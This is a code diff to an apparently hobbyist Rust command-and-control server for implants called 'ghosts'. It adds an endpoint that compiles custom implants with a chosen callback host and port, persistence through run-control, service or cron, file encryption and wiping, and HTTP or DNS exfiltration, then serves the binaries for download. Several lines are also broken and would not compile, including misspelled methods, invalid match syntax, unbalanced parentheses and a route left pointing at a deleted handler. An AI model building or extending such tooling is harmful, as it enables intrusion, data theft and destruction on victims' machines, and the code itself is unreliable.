@@ -7,6 +7,9 @@ use dashmap::DashMap;
 use serde::{Deserialize, Serialize};
 use std::sync::Arc;
 use uuid::Uuid;
+use std::process::Stdio;
+use tokio::process::Command;
+use tower_http::services::ServeDir;
 
 // === ENUMS ===
 #[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
@@ -23,7 +26,7 @@ pub enum TaskStatus {
 pub struct Ghost {
     pub id: String,         // UUID v7
     pub hostname: String,   // system hostname of machine on which the implant resides
-    pub os: String,         // operating system, for now we'll just send correct implant, TODO to automatically detect OS and send correct implant
+    pub os: String,         // operating system
     pub sleep_interval: Option<i64>,
     pub jitter_percent: Option<i16>,
     pub update_pending: Option<bool>,
@@ -76,6 +79,30 @@ pub struct TaskDefinition {
 pub struct TaskRequest {
     pub command: String,
     pub args: String
+}
+
+// === BUILDER ===
+#[derive(Deserialize, Debug)]
+pub struct GhostBuildRequest {
+        pub target_url: String,
+        pub target_port: String,
+        pub enable_debug: bool,
+
+        // persistence
+        pub enable_persistence: bool,
+        pub persist_runcontrol: bool,
+        pub persist_service: bool,
+        pub persist_cron: bool,
+
+        // impact
+        pub enable_impact: bool,
+        pub impact_encrypt: bool,
+        pub impact_wipe: bool,
+
+        // exfiltration
+        pub enable_exfil: bool,
+        pub exfil_http: bool,
+        pub exfil_dns: bool
 }
 
 // === SHARED STATE ===
@@ -158,10 +185,6 @@ async fn handle_ghost_heartbeat(
     };
 
     Json(response)
-}
-
-async fn handle_ghost_file_download(Path(_id): Path<String>) {
-    todo!("placeholder file download")
 }
 
 async fn handle_ghost_upload() {
@@ -258,7 +281,7 @@ async fn handle_charon_kill_ghost(
 ) {
     let kill_task = Task {
         id: Uuid::now_v7().to_string(),
-        command: "STOP_HAUNT".to_string(),  // magic command for implant to interpret, TODO: think about it
+        command: "STOP_HAUNT".to_string(),
         args: "".to_string(),
         status: TaskStatus::Pending,
         result: None
@@ -269,12 +292,93 @@ async fn handle_charon_kill_ghost(
     state.pending_tasks.entry(id).or_insert_with(Vec::new).push(kill_task);
 }
 
+// BUILDER
+async fn handle_charon_build(
+    State(_state): State<Arc<ServerState>>,
+    Json(req): Json<GhostBuildRequest>
+) -> Result<Json<String>, String> {
+    println!("build requested for target {}:{}", req.target_url, req.target_port);
+    
+    let build_id = Uuid::now_v7().to_string();
+    let source_path = std::env::var("GHOST_SOURCE_PATH").unwrap_or("/usr/src/GHOST".to_string());
+    let build_dir = format!("home/shadowuser/builds/{}", build_id); // TODO: make this not exclusive to docker
+
+    tokio::fs::create_dir_all(&build_dir).await.mapp_err(|e| format!("fs error: {}", e))?;
+
+    let mut args = vec![
+        source_path,
+        format!("-DSHADOW_URL={}", req.target_url),
+        format!("-DSHADOW_PORT={}", req.target_port),
+        format!("-DENABLE_DEBUG={}", if req.enable_debug { "ON" } else { "OFF" }),
+        format!("-DENABLE_PERSISTENCE={}", if req.enable_persistence { "ON" } else { "OFF" })),
+        format!("-DENABLE_IMPACT={}", if req.enable_impact { "ON" } else { "OFF" })),
+        format!("-DENABLE_EXFIL={}", if req.enable_exfil { "ON" } else { "OFF" })),
+    ];
+
+    if req.enable_persistence {
+        args.push(format!("-DPERSIST_RUNCONTROL={}", if req.persist_runcontrol { "ON" } else { "OFF" }));
+        args.push(format!("-DPERSIST_SERVICE={}", if req.persist_service { "ON" } else { "OFF" }));
+        args.push(format!("-DPERSIST_CRON={}", if req.persist_cron { "ON" } else { "OFF" }));
+    }
+
+    if req.enable_impact {
+        args.push(format!("-DIMPACT_ENCRYPT={}", if req.impact_encrypt { "ON" } else { "OFF" }));
+        args.push(format!("-DIMPACT_WIPE={}", if req.impact_wipe { "ON" } else { "OFF" }));
+    }
+
+    if req.enable_exfil {
+        args.push(format!("-DEXFIL_HTTP={}", if req.exfil_http { "ON" } else { "OFF" }));
+        args.push(format!("-DEXFIL_DNS={}", if req.exfil_dns { "ON" } else { "OFF" }));
+    }
+
+    println!("runnin cmake in {}", build_dir);
+    match cmake_output = Command::new("cmake")
+        .current_dir(&build_dir)
+        .args(&args)
+        .stdout(Stdio::piped())
+        .stderr(Stdio::piped())
+        .output()
+        .await
+        .map_err(|e| format!("cmake failed {}", e))?;
+
+    if !cmake_output.status.success() {
+        let err_msg = String::From_utf8_lossy(&cmake_output.stderr);
+
+        return Err(format!("cmake failed {}", err_msg));
+    }
+
+    println!("running make in {}", build_dir);
+    match make_output = Command::new("make")
+        .current_dir(&build_dir)
+        .arg("-j4")     // multithread, why not
+        .stdout(Stdio::piped())
+        .stderr(Stdio::piped())
+        .output()
+        .await
+        .map_err(|e| format!("make failed {}", e))?;
+
+    if !make_output.status.success() {
+        let err_msg = String::From_utf8_lossy(&make_output.stderr);
+
+        return Err(format!("make failed {}", err_msg));
+    }
+
+    // TODO fix path to not use bin/ghost uwu 
+    let download_path = format!("/api/v1/ghost/download/{}/bin/Ghost", build_id);
+
+    println!("build success. available at {}", download_path);
+    Ok(Json(download_path))
+}
+
 pub fn app(state: Arc<ServerState>) -> Router {
+    let serve_dir = ServeDir::new("/home/shadowuser/builds");
+
     let ghost_routes = Router::<Arc<ServerState>>::new()
         .route("/register", post(handle_ghost_register))        // ghost init (register)
         .route("/heartbeat", post(handle_ghost_heartbeat))      // ghosts will beacon to get tasks from here (or will just beacon their status and get back whether or not they have a task; smth to think about)
         .route("/files/{id}", get(handle_ghost_file_download))  // payload/implant download point
-        .route("/upload", post(handle_ghost_upload));           // exfiltration endpoint for data dumps
+        .route("/upload", post(handle_ghost_upload))            // exfiltration endpoint for data dumps
+        .nest_service("/download", serve_dir);
 
     let charon_routes = Router::<Arc<ServerState>>::new()
         .route("/ghosts", get(handle_charon_list_ghosts))               // list active GHOSTs
@@ -282,11 +386,12 @@ pub fn app(state: Arc<ServerState>) -> Router {
         .route("/ghosts/{id}/task", post(handle_charon_queue_task))     // assign a task to GHOST
         .route("/ghosts/{id}/tasks", get(handle_charon_get_ghost_tasks))    // get all tasks for GHOST
         .route("/tasks/{id}", get(handle_charon_get_task_details))      // get single task details
-        .route("/ghosts/{id}/kill", post(handle_charon_kill_ghost));    // killswitch for GHOST
+        .route("/ghosts/{id}/kill", post(handle_charon_kill_ghost))    // killswitch for GHOST
+        .route("/build", post(handle_charon_build));
 
     // init router with route -> handler mapping
     Router::<Arc<ServerState>>::new()
-        .route("/health", get(|| async { "OK" }))   // simple healthcheck for docker compose if it happens
+        .route("/health", get(|| async { "OK" }))
         .nest("/api/v1/ghost", ghost_routes)
         .nest("/api/v1/charon", charon_routes)
         .with_state(state)
